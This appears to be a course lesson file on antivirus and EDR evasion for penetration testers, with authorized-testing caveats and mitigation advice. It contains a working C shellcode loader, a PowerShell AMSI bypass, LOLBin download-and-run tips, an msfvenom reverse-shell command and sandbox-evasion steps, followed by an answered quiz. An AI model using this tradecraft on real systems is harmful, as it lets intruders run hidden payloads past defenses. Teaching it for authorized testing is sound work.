{
  "lesson_id": "33837286-92a0-4202-ac6e-160606238c91",
  "domain": "pentest",
  "title": "Antivirus Evasion Techniques",
  "difficulty": 3,
  "order_index": 20,
  "prerequisites": [
    "pentest_03"
  ],
  "concepts": [
    "AV detection mechanisms (signature, heuristic, behavioral, cloud-based)",
    "Code obfuscation techniques",
    "Payload encoding and encryption",
    "Process injection methods",
    "AMSI bypass techniques",
    "In-memory execution (PowerShell, C#)",
    "Custom shellcode loaders",
    "Testing payloads without burning them"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Analyze how modern AV/EDR engines detect malicious code across signature, heuristic, and behavioral layers",
    "Design layered obfuscation, encoding, and encryption strategies for custom payloads",
    "Implement process injection and in-memory execution techniques using native APIs and indirect syscalls",
    "Bypass AMSI responsibly and combine script obfuscation with stealthy loaders",
    "Establish private testing pipelines that validate evasion while preserving operational security"
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "block_id": "dcb6789f-f11e-4b1f-b621-6daa35518327",
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to the arena of antivirus evasion. At this stage in your penetration testing journey you have already learned how to gain\ninitial access; now you must learn how to keep that access without tripping alarms. Your mindset must blend creativity with\nscientific rigor. Every payload you compile is an experiment against layers of signature, heuristic, and behavioral defenses.\nInstead of asking “How do I bypass antivirus?”, ask “How do I understand the detection logic well enough to influence it?” That\nshift turns you from a script kiddie into a disciplined operator.\n\nBegin with empathy for defenders. Blue teams are dealing with millions of malware samples every day. Vendors respond by deploying\ncloud-assisted scanning, machine learning classifiers, and EDR sensors that look at memory, API usage, and process lineage. Your\njob is not to humiliate those controls, but to help organizations verify whether their defensive stack can withstand modern tradecraft.\nWhen you demonstrate a bypass in an authorized test, you should immediately follow with mitigation advice.\n\nAdopt these mental anchors before you build anything:\n\n1. **Assume inspection everywhere.** Disk, memory, network, and even the call stack are monitored. AMSI inspects scripts, ETW logs\nPowerShell, and cloud sandboxes detonate suspicious binaries. Work backwards: if AMSI is a gatekeeper, how can you avoid or modify\nthe content it inspects?\n\n2. **Think in layers.** Combine obfuscation, encryption, and staged execution. No single trick beats all engines. When one layer is\ndetected, analyze the telemetry to understand why. Did a string pattern match? Did process injection leave a telltale API sequence?\nUse that feedback loop relentlessly.\n\n3. **Build ethical muscle memory.** Only deploy custom payloads inside authorized environments. Never reuse client data or proprietary\ncode for other engagements. Maintain version-controlled repositories with clear documentation so you can reproduce every bypass\nfor your report. Do not share bypass techniques publicly without client permission.\n\n4. **Measure, don’t guess.** Use controlled sandboxes, Defender test VMs, and private cloud detonation labs to gather data. Keep a\nspreadsheet tracking which obfuscation combinations succeed. Treat your payload pipeline like a scientific process.\n\n5. **Respect the risk.** Antivirus evasion often means executing code that could be weaponized. When you craft shellcode loaders or\nprocess injection routines, ensure they have safety valves: restrict callbacks to your own lab, implement kill switches, and log\nexecution to avoid ambiguity about what happened during the test.\n\nBy the end of this lesson you will know how modern AV engines classify threats, how to design layered evasion strategies, and how\nto develop custom loaders in languages like C and Rust. You will practice bypassing AMSI responsibly, executing payloads entirely\nin memory, and validating bypasses without burning them in public telemetry. Approach every step with humility—defenders are\nconstantly improving, and your goal is to help them, not to play cat-and-mouse for ego."
      }
    },
    {
      "block_id": "0a5f9ca6-3818-4728-81e7-97d559ab34f7",
      "type": "explanation",
      "content": {
        "text": "## Understanding Modern Antivirus Detection\n\nBefore you write a single line of obfuscated code, study how antivirus (AV) and endpoint detection and response (EDR) products\nidentify malicious behavior. Detection falls into four broad categories, often combined in layered engines.\n\n### 1. Signature-Based Detection\n\nTraditional AV relies on hashes, byte sequences, and YARA-like pattern matching. Even though threat actors try to alter payloads,\nsignatures are still effective against commodity malware. Key elements:\n\n- **Static file hashes** – MD5, SHA-1, and SHA-256 of known malware.\n- **Pattern signatures** – Byte sequences that appear in specific malware families (e.g., shellcode stubs, packer markers).\n- **Macro and script signatures** – Snippets of VBA or PowerShell linked to known malicious campaigns.\n\nSignature evasion means changing the observable bytes: recompile, encrypt, pad, or randomize the payload. But signatures alone are\nnot your main opponent anymore.\n\n### 2. Heuristic and Machine Learning Detection\n\nHeuristics look for suspicious patterns rather than exact matches. Examples include:\n\n- Presence of `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread` in the same binary.\n- Macros containing suspicious strings like `PowerShell`, `WScript.Shell`, or `cmd.exe /c`.\n- Files with mismatched extensions and content (e.g., a PE file inside a `.jpg`).\n\nMachine learning models consume thousands of features such as imported functions, section entropy, strings, and metadata. Vendors\ntrain on massive malware corpora. To bypass, you must randomize features, remove obvious indicators, or execute behavior that\nlooks benign at first glance.\n\n### 3. Behavioral and Cloud-Based Detection\n\nEDR platforms monitor process trees, network connections, module loads, and memory allocations. They send telemetry to the cloud,\nwhere analytics correlate patterns across enterprises. Typical detections include:\n\n- An Office application spawning `powershell.exe` with encoded commands.\n- A process injecting code into a system binary like `lsass.exe`.\n- Suspicious DLL loads from unusual directories or with unsigned code.\n\nBehavioral defenses are hardest to bypass because they analyze runtime context. Your strategies must minimize suspicious events,\nblend into normal processes, and use living-off-the-land binaries (LOLBins) or custom loaders that mimic legitimate workflows.\n\n### 4. Cloud Detonation and Reputation Systems\n\nFiles submitted via email or download are often detonated in cloud sandboxes. Behavior is observed for several minutes; the sandbox\ncaptures API calls, file writes, and network beacons. Reputation systems track how often a file hash appears worldwide. Unknown\nbinaries with low prevalence are more likely to be scrutinized.\n\nTo work around these controls:\n\n- Use staged delivery. Send an innocuous dropper that fetches payloads only after anti-analysis checks succeed.\n- Delay execution or require user interaction, forcing sandboxes to time out.\n- Generate per-target binaries so each sample has unique hashes, reducing the chance of reputation-based blocking.\n\nWith this detection landscape in mind, every evasion technique becomes a targeted response to a specific defensive capability."
      }
    },
    {
      "block_id": "7f667542-1f21-40b6-bb3f-44d76feec169",
      "type": "explanation",
      "content": {
        "text": "## Obfuscation, Encoding, and Payload Encryption\n\n### Code Obfuscation Fundamentals\n\nObfuscation alters the structure of your code without changing its behavior. Effective strategies include:\n\n- **Control flow flattening** – Transform straightforward `if` statements and loops into state-machine style logic using switch\ncases and computed jumps. Tools like LLVM Obfuscator or Tigress can automate this for C/C++ payloads.\n\n- **String obfuscation** – Replace plaintext strings with runtime-decrypted versions. Example in C#:\n\n```csharp\npublic static string DecryptString(string base64Cipher)\n{\n    byte[] data = Convert.FromBase64String(base64Cipher);\n    for (int i = 0; i < data.Length; i++)\n    {\n        data[i] = (byte)(data[i] ^ 0x37);\n    }\n    return Encoding.UTF8.GetString(data);\n}\n```\n\n- **Symbol renaming** – Randomize function and variable names to prevent signature creation.\n\n### Payload Encoding and Encryption\n\nEncoding converts payloads into alternative representations; encryption adds secrecy. Combine both to hide shellcode in transit:\n\n1. **Base64 + XOR** – A classic layering approach.\n2. **AES-GCM encrypted blob** – Use a pre-shared key or derive one from environmental values (hostname, domain). Decrypt just before execution.\n3. **Shikata Ga Nai / Metasploit encoders** – Provide polymorphic stubs but may be detected due to popularity. Custom encoders offer more stealth.\n4. **Custom packers** – Compress and encrypt payloads, unpack at runtime using position-independent code. Keep the unpacking stub minimal to reduce detection surface.\n\n### Leveraging LOLBins for Delivery\n\nInstead of dropping executables, encode payloads inside scripts executed by trusted binaries:\n\n- Use `certutil -decode` to transform Base64 into binary.\n- Abuse `powershell.exe` to download, decrypt, and run payloads in memory.\n- Employ `msbuild.exe` with inline C# to compile encrypted shellcode at runtime.\n\n### Testing Obfuscation Effectiveness\n\nCreate an automation pipeline:\n\n1. Generate payload variations (randomized keys, mutated control flow).\n2. Scan them with offline AV engines (Defender, ClamAV) and hybrid-analysis sandboxes.\n3. Record detection results and strings flagged.\n4. Iterate by removing flagged patterns (e.g., embed API hashes instead of plaintext names).\n\nRemember: obfuscation is a delaying tactic. Skilled analysts can reverse your code. The goal is to avoid automated blocking during\na sanctioned engagement, not to create unstoppable malware."
      }
    },
    {
      "block_id": "489c1ad1-6273-4ae5-ba9f-0573096c3c7a",
      "type": "explanation",
      "content": {
        "text": "## Process Injection and In-Memory Execution Techniques\n\nOnce your payload reaches the target, you need stealthy execution. Process injection hides malicious code inside legitimate\nprocesses, while in-memory execution avoids touching disk. Learn the core patterns and their trade-offs.\n\n### 1. CreateRemoteThread Injection\n\nSteps:\n\n1. Obtain a handle to the target process (`OpenProcess`).\n2. Allocate memory (`VirtualAllocEx`).\n3. Write shellcode (`WriteProcessMemory`).\n4. Launch a thread (`CreateRemoteThread`).\n\nPros: straightforward. Cons: heavily monitored. EDR tools flag this API sequence instantly. Use only for educational comparison.\n\n### 2. Process Hollowing\n\n1. Launch a suspended process (e.g., `svchost.exe`).\n2. Unmap its original sections (`ZwUnmapViewOfSection`).\n3. Map your payload into the process (`WriteProcessMemory`, `SetThreadContext`).\n4. Resume the main thread.\n\nHollowing blends into legitimate process names but is still detectable via memory forensics. To reduce risk, choose process images\nthat match the parent context (e.g., spawn `calc.exe` from `explorer.exe`).\n\n### 3. Thread Hijacking & APC Injection\n\n- **Thread hijacking** – Suspend an existing thread, change its instruction pointer to your shellcode, resume.\n- **Asynchronous Procedure Calls (APC)** – Queue an APC on a thread in alertable state (`QueueUserAPC`). Commonly used with `rundll32.exe`.\n\nThese methods may bypass basic monitoring but still leave forensic artifacts. Combine with encryption and obfuscated API resolution.\n\n### 4. Reflective DLL Injection\n\nReflective loaders map a DLL into memory without the Windows loader. Key steps:\n\n- Parse PE headers manually.\n- Resolve imports dynamically.\n- Call the DLL entry point from memory.\n\nFrameworks like `sRDI` (Shellcode Reflective DLL Injection) convert DLLs into position-independent shellcode. Update stub names and\navoid known strings to reduce detection.\n\n### 5. Shellcode Loader Example (C)\n\n```c\n#include <windows.h>\n#include <stdio.h>\n\nunsigned char payload[] = { /* AES-decrypted shellcode bytes here */ };\n\nFARPROC resolve(LPCSTR name)\n{\n    HMODULE k = GetModuleHandleA(\"kernel32.dll\");\n    return GetProcAddress(k, name);\n}\n\nint main()\n{\n    LPVOID exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (!exec) return 1;\n    RtlMoveMemory(exec, payload, sizeof(payload));\n    DWORD old;\n    VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old);\n    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);\n    WaitForSingleObject(th, INFINITE);\n    return 0;\n}\n```\n\nTo evade detection:\n\n- Resolve APIs dynamically (hashing, `GetProcAddress` loops).\n- Avoid `VirtualAlloc` by using `NtAllocateVirtualMemory` via direct syscalls.\n- Unhook user-mode API functions before injection.\n\n### 6. In-Memory Execution with PowerShell & C#\n\n- PowerShell: use `Invoke-ReflectivePEInjection` or custom scripts to load DLLs into memory. Bypass AMSI first (covered later).\n- C# loaders: compile assemblies that load shellcode from embedded resources, decrypt on the fly, and execute via delegates.\n- Rust loaders: benefit from low-level control and modern tooling. Use crates like `windows` for API bindings and embed encrypted\npayloads within the binary.\n\nEach technique should be accompanied by detection evaluation: inspect ETW traces, Sysmon logs, and Defender for Endpoint alerts.\nDocument which behaviors triggered responses so you can advise clients on EDR tuning."
      }
    },
    {
      "block_id": "f7f9a917-46e1-4510-8a8a-b880b6748998",
      "type": "explanation",
      "content": {
        "text": "## AMSI Bypass Strategies and Script-Based Tradecraft\n\nThe Antimalware Scan Interface (AMSI) allows security tools to inspect scripts and dynamic content (PowerShell, JavaScript, VBA)\nbefore execution. To run malicious scripts in memory, you must bypass or disable AMSI in a controlled, ethical way.\n\n### AMSI Architecture\n\n- Applications like PowerShell call `AmsiInitialize`, `AmsiOpenSession`, and `AmsiScanBuffer` to submit content.\n- Security providers (Defender, third-party AV) register as AMSI providers and return `AMSI_RESULT_DETECTED` if malicious content is found.\n- Script engines are typically still running even if AMSI flags content; they simply refuse to execute it.\n\n### Bypass Techniques\n\n1. **Patch AMSI in Memory** – Use PowerShell to modify the `AmsiScanBuffer` function.\n\n```powershell\n$signature = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n$field = $signature.GetField('amsiInitFailed','NonPublic,Static')\n$field.SetValue($null,$true)\n```\n\nMore advanced bypasses patch the return value of `AmsiScanBuffer` to always indicate success.\n\n2. **Unmanaged Code Patching** – Inject shellcode that locates `amsi.dll`, modifies the function prologue to `ret 0x8`. This requires\nmemory writing permissions and may trigger EDR if not obfuscated.\n\n3. **COM Hijacking / Alternate Hosts** – Run PowerShell within `Runspace` hosts that do not load AMSI (e.g., `System.Management.Automation.PowerShell.Create()` in custom C# binaries).\n\n4. **Environment-Based Bypass** – Execute scripts in 32-bit vs. 64-bit hosts to avoid certain hooks, or load older PowerShell versions\nwithout AMSI (v2). Always test thoroughly; defenders may detect version downgrades.\n\n### Ethical Considerations\n\nBypassing AMSI disables a core security control. Only do this under written authorization. Restore AMSI after testing and document\nhow to re-enable protections. Provide guidance on Defender ASR rules that prevent child processes from PowerShell to reduce reliance\non AMSI.\n\n### Script Obfuscation After AMSI Bypass\n\nEven with AMSI bypassed, EDRs may use script block logging or memory scanning. Combine bypasses with obfuscation frameworks:\n\n- `Invoke-Obfuscation` – Randomizes command syntax, encodes strings, manipulates abstract syntax trees.\n- Custom token replacement – Replace `System.Management.Automation` with `[type]\"System\"+\".Management\"+\".Automation\"` patterns.\n- JIT compilation – Use C# `Add-Type` to compile loader logic so the script body remains minimal.\n\nRemember to store plain-text versions in secure repositories for auditing. Never lose track of what the obfuscated code does."
      }
    },
    {
      "block_id": "6b700315-c39b-45de-9050-1c38188e3d73",
      "type": "explanation",
      "content": {
        "text": "## Operational Testing Without Burning Payloads\n\nAvoid uploading fresh payloads to public sandboxes. Once a hash is seen globally, defenders can write signatures. Build a private\nvalidation workflow.\n\n### Private Sandbox Infrastructure\n\n- **Hyper-V/VMware Lab** – Create snapshots of Windows systems with Defender, CrowdStrike Falcon Sensor (if licensed), and logging\nagents. Revert to clean state between tests.\n\n- **Network Isolation** – Use pfSense or a virtual switch to simulate outbound filtering. Monitor traffic with Wireshark or Zeek.\n\n- **Automated Testing Harness** – Scripts that copy payloads into VMs, execute them, collect Defender logs (`Get-MpThreat`), and\nexport event logs for analysis.\n\n### Evasion Metrics\n\nTrack:\n\n- Detection or quarantine status (blocked, allowed, suspicious).\n- Time to detection (immediate, delayed after cloud submission).\n- Telemetry artifacts (event IDs, network indicators, file paths).\n- Required modifications (string removal, API hashing, different loader).\n\n### Reporting & Remediation Guidance\n\nProvide clients with a matrix summarizing payload variations vs. defensive responses. For each bypass, recommend mitigations:\n\n- Enable Defender features (`Block abuse of exploited vulnerable signed drivers`, `Block credential stealing from LSASS`).\n- Harden PowerShell (Constrained Language Mode, script block logging, transcription).\n- Deploy application control (AppLocker, WDAC) to restrict unsigned binaries and scripts.\n- Implement memory scanning and kernel callbacks to detect injection artifacts.\n\n### Retaining OPSEC\n\n- **Do not reuse payloads across clients.** Compile new binaries with unique keys each time.\n- **Log internally.** Maintain run logs with timestamps, operator names, hostnames, and actions taken.\n- **Secure storage.** Store payload source code in encrypted repositories with role-based access.\n- **Client handoff.** Provide sanitized versions to clients if they request for detection engineering, ensuring secrets (C2 URLs,\nencryption keys) are removed or replaced.\n\nYour professionalism in handling payloads builds trust and sets you apart from opportunistic attackers."
      }
    },
    {
      "block_id": "a950f0a6-0af0-4fe4-96e8-186b0e70667c",
      "type": "explanation",
      "content": {
        "text": "## Engineering a Custom Loader Pipeline\n\nTreat payload development like a software project. A disciplined pipeline improves reliability and makes your results repeatable.\n\n### Source Control & Build Automation\n\n- Maintain a private Git repository with separate branches for each client engagement. Store loader templates, encryption modules,\nand configuration files.\n- Use build scripts (Makefiles, PowerShell, or Invoke-Build) to automate compilation for x86 and x64, embed randomized keys, and\nproduce versioned binaries. Tag releases with commit hashes for auditability.\n- Integrate static analysis to catch mistakes: `clang-tidy` for C/C++, `clippy` for Rust. Security comes from stability; a crash\nduring a test wastes precious time and may alert defenders.\n\n### Modularity\n\nDesign loaders with interchangeable components:\n\n1. **Payload Retrieval** – Local embedded shellcode, SMB/WebDAV fetcher, or HTTPS stager.\n2. **Decryption Engine** – AES, ChaCha20, or custom XOR rotators. Parameterize keys and IVs.\n3. **Execution Strategy** – Indirect syscalls, APC injection, or reflective DLL loading.\n4. **Cleanup & Logging** – Wipe decrypted buffers, record execution metadata, optionally self-delete.\n\nBy toggling modules, you can adapt quickly when a detection rule fires.\n\n### Telemetry-Aware Development\n\nInstrument your code to log benign metadata to a local file or named pipe (accessible only to you). Examples:\n\n- Timestamp and host information when the loader starts and finishes.\n- The path of the parent process to verify alignment with your delivery vector.\n- Return codes from API calls to troubleshoot failing injections.\n\nEnsure logs do not contain sensitive data and are deleted after collection.\n\n### Testing Variants\n\nFor each release candidate:\n\n1. Compile three variants with different obfuscation settings.\n2. Run them in your sandbox with Defender and Sysmon active.\n3. Record detection outcomes, CPU usage, and memory footprint.\n4. Use tools like `pe-sieve` and `HollowsHunter` to see what defenders would detect; adjust sections with high entropy or suspicious\nimport tables.\n\n### Documentation for Clients\n\nCreate runbooks explaining how your loader works, the controls it bypassed, and how defenders can detect similar activity. Include:\n\n- API sequences observed during execution.\n- Hashes of each variant and the detection status.\n- Recommended Sigma rules or YARA signatures focusing on behavioral artifacts (e.g., `NtProtectVirtualMemory` after suspicious\nnetwork activity).\n\n### Continuous Improvement\n\nAfter each engagement, archive payloads, compare detection responses to previous tests, and refine your base templates. Track vendor\nupdates—Microsoft frequently adds new AMSI signatures and EDR heuristics. Staying current ensures your assessments remain realistic."
      }
    },
    {
      "block_id": "339de157-3d0b-4fe3-bd00-c53a35334078",
      "type": "explanation",
      "content": {
        "text": "## Case Study Walkthrough: Bypassing Microsoft Defender Step-by-Step\n\nUse this structured walkthrough to simulate a real engagement while maintaining ethical boundaries.\n\n1. **Baseline Measurement** – Execute a simple PowerShell Empire stager on a fully patched Windows 11 host with Defender. Observe\nthat AMSI blocks the script and Defender quarantines the payload. Record event IDs (1116 for malware detection, 4104 for script block).\n\n2. **Introduce Obfuscation** – Apply token obfuscation and string splitting to the script. Defender still detects it due to AMSI\npattern matching. This demonstrates the need for deeper modifications.\n\n3. **Implement AMSI Patch** – Inject a PowerShell snippet that sets `amsiInitFailed` to true. Execute again; the script now runs,\nbut Defender’s behavior monitoring flags the subsequent `Invoke-Expression` call. Lesson: AMSI bypass is necessary but not sufficient.\n\n4. **Switch to C# Loader** – Compile a C# binary that hosts a PowerShell runspace, patches AMSI using unmanaged API calls, and loads\nencrypted shellcode. Defender allows execution, but after 30 seconds cloud telemetry marks the binary as suspicious due to uncommon\nfile reputation.\n\n5. **Randomize and Harden** – Rebuild the loader with unique GUID-based assembly names, embed encrypted shellcode with AES-GCM, and\nadd environment checks (process list, domain membership). Delay execution by 45 seconds. Defender no longer flags the binary, but\nSysmon logs reveal `VirtualAlloc` + `WriteProcessMemory` sequence.\n\n6. **Adopt Indirect Syscalls** – Replace user-mode API calls with syscalls generated by `syswhispers2`. Inject into a newly spawned\n`werfault.exe` process to mimic Windows error reporting. Sysmon now shows only process creation and minimal suspicious activity.\n\n7. **Validation** – Run the loader multiple times, capturing Defender alerts (none), Sysmon logs, and packet captures. Confirm that\noutbound HTTPS traffic is indistinguishable from legitimate browsing (use domain fronting inside the lab). Document every change.\n\n8. **Mitigation Guidance** – Recommend enabling Defender ASR rules, enforcing WDAC policies, and alerting on unusual `werfault.exe`\nprocess trees. Suggest analyzing ETW telemetry for syscalls from untrusted binaries as a compensating control.\n\nThis case study illustrates iterative tuning. Share it with clients to demonstrate that evasion is a process of systematic\nexperimentation rather than a single magic trick."
      }
    },
    {
      "block_id": "62fe31ea-8cb1-44e5-ab8d-40b6282fb702",
      "type": "video",
      "content": {
        "title": "Video: Modern Antivirus Evasion Techniques",
        "url": "https://www.youtube.com/watch?v=7KxQCJ8LoM0",
        "description": "This conference talk demonstrates layered AV evasion, AMSI bypasses, and custom loaders in practice."
      }
    },
    {
      "block_id": "89173dc6-de41-4925-9b71-cd52696f4dd1",
      "type": "code_exercise",
      "content": {
        "text": "### Hands-On Lab: Building and Testing a Custom Shellcode Loader\n\nPerform this lab in an isolated environment with snapshots. Never execute offensive code on production networks.\n\n1. **Set Up the Lab**\n   - Prepare three VMs: Windows 11 with Defender default settings, Windows Server 2019 with Defender and PowerShell logging, and\n     Kali Linux for payload compilation and control.\n   - Install Visual Studio Build Tools or Mingw-w64 on Kali (`sudo apt install mingw-w64 nasm`).\n   - Configure Windows event forwarding or use `Get-WinEvent` to pull logs after tests.\n\n2. **Generate Shellcode**\n   - Use `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.5 LPORT=443 EXITFUNC=thread -f raw -o beacon.bin`.\n   - Encrypt the shellcode with a custom Python script applying AES-256 and random IVs per build.\n\n3. **Develop the Loader (C or C++)**\n   - Implement dynamic API resolution using hashed function names (e.g., CRC32 of `VirtualAlloc`).\n   - Decrypt the shellcode at runtime using AES from `bcrypt.dll` or your custom routine.\n   - Replace `CreateThread` with `NtCreateThreadEx` via direct syscalls from a handcrafted stub (use `syswhispers2` to generate).\n   - Add sleep jitter (randomized between 5 and 20 seconds) before execution to evade sandboxes.\n\n4. **Integrate AMSI Bypass (PowerShell Stager)**\n   - Create a PowerShell script that patches AMSI, downloads your encrypted payload from an internal web server, decrypts it, and\n     injects it into a spawned process using `CreateRemoteThread`.\n   - Obfuscate the script with `Invoke-Obfuscation` and custom string tokenization. Document each transformation.\n\n5. **Test Execution**\n   - Run the PowerShell stager on the Windows 11 VM. Observe Defender alerts, event logs (ID 4104, 1116), and network telemetry.\n   - If blocked, adjust obfuscation or injection technique (e.g., switch to `Process Hollowing` or `Thread Hijacking`).\n   - Once successful, capture the meterpreter session in Kali and immediately terminate to avoid unintended activity.\n\n6. **EDR Simulation**\n   - Install a trial version of an EDR product (e.g., Elastic Defender) or simulate with Sysmon + Sigma rules.\n   - Re-run the payload, collect telemetry, and tune the loader to minimize suspicious indicators.\n   - Experiment with Rust-based loader using the `windows` crate and compare detection outcomes.\n\n7. **Document Findings**\n   - Record hash values, build settings, detection results, and mitigation recommendations.\n   - Create a presentation slide summarizing bypassed controls and defensive gaps.\n   - Prepare sanitized code samples for the client to build detections safely.\n\nDeliverables:\n   - Source code for loaders (C/C++, Rust) with comments.\n   - PowerShell stager script (obfuscated and deobfuscated versions).\n   - Lab report with detection matrix, screenshots, and suggested remediations."
      }
    },
    {
      "block_id": "d9503c34-cf90-4b1d-9a27-67c0d8235038",
      "type": "real_world",
      "content": {
        "text": "### Real-World Evolution of AV Evasion\n\n- **Early 2000s: Packers & Polymorphism** – Malware authors used UPX and custom packers to change hashes. Antivirus vendors responded\nwith unpacking emulators.\n\n- **2010: Stuxnet** – Employed multiple zero-days and legitimate certificates. Payloads were signed to bypass trust-based defenses.\n\n- **2013-2016: FIN7 & Carbanak** – Crafted macros and custom loaders that used reflective DLL injection. They continuously modified\nobfuscation to evade detection and often tested against Defender before deployment.\n\n- **2017: NotPetya** – Leveraged EternalBlue for propagation but also incorporated credential dumping and code-signing certificates\nto avoid early detection.\n\n- **2018-2021: APT10 & Lazarus Group** – Adopted fileless techniques using PowerShell and WMI for in-memory execution. Lazarus used\nROKRAT, an HTA-based loader with heavy obfuscation and cloud storage C2.\n\n- **2022-2023: Criminal Ecosystems** – Malware-as-a-Service platforms offer builders with built-in AV evasion, including direct syscall\nusage, AMSI bypass, and hardware breakpoints to evade debugging.\n\nThese case studies show a progression from simple packing to sophisticated memory-resident implants. Your penetration tests should\nmirror current tactics: encrypted payloads, indirect syscalls, process injection, and minimal disk artifacts. Highlight to clients\nthat defenders need layered controls—EDR, memory scanning, network analytics, and strong access policies—to counter these tactics."
      }
    },
    {
      "block_id": "66c5e616-0bd1-4273-83d7-167c1b3d60d5",
      "type": "memory_aid",
      "content": {
        "text": "### Memory Hooks: AV Evasion Checklist\n\n- **Know the Detector** – Signature, heuristic, behavioral, cloud.\n- **Mutate the Payload** – Obfuscate code, encrypt strings, randomize builds.\n- **Choose Stealthy Execution** – In-memory loaders, indirect syscalls, process context alignment.\n- **Neutralize Gatekeepers** – AMSI bypass, script obfuscation, ETW tampering (with caution).\n- **Test Privately** – Controlled sandboxes, logging, detection matrix.\n- **Report Responsibly** – Provide mitigation guidance and restore defenses.\n\nMnemonic: **“KMS NTR”** – **K**now, **M**utate, **S**tealth, **N**eutralize, **T**est, **R**eport."
      }
    },
    {
      "block_id": "70bacfa3-8977-488b-8fa8-1b386d0f2ef4",
      "type": "reflection",
      "content": {
        "text": "1. Which detection layer in your lab caught the payload first, and how can you modify the loader to avoid that signal without\nintroducing instability?\n2. What guardrails will you implement to ensure custom bypasses are never reused outside authorized engagements?\n3. How will you explain the risk of AMSI bypasses to executive stakeholders so they understand both the severity and the mitigations?\n4. If a payload is blocked only after cloud detonation, how can you adjust staging to minimize that exposure while staying ethical?"
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "9878816b-96b7-4ed5-a7b5-c141d6dee774",
      "type": "multiple_choice",
      "difficulty": 3,
      "question": "Why is using direct syscalls in a shellcode loader considered an effective AV evasion technique?",
      "options": [
        "It automatically disables AMSI, preventing script inspection",
        "It allows a loader to bypass user-mode API hooks set by EDR products",
        "It hides the payload inside Alternate Data Streams on disk",
        "It prevents the payload from needing any encryption or obfuscation"
      ],
      "correct_answer": "It allows a loader to bypass user-mode API hooks set by EDR products",
      "explanation": "Direct syscalls invoke Windows kernel services without using user-mode APIs like VirtualAlloc or NtCreateThreadEx, sidestepping hooks placed by EDR and reducing behavioral indicators."
    },
    {
      "question_id": "dcc7466c-b957-4309-9dbc-97edc897ff53",
      "type": "multiple_choice",
      "difficulty": 3,
      "question": "Which practice best helps prevent \"burning\" a new AV bypass payload before a client engagement?",
      "options": [
        "Uploading the payload to VirusTotal to verify detections",
        "Testing the payload only on production endpoints for realism",
        "Evaluating the payload in a private, instrumented lab and keeping hashes off public services",
        "Distributing the payload to peers for crowdsourced testing"
      ],
      "correct_answer": "Evaluating the payload in a private, instrumented lab and keeping hashes off public services",
      "explanation": "Private testing avoids sending hashes or samples to shared reputation systems. Maintaining an internal lab allows you to validate functionality without alerting vendors or defenders prematurely."
    }
  ]
}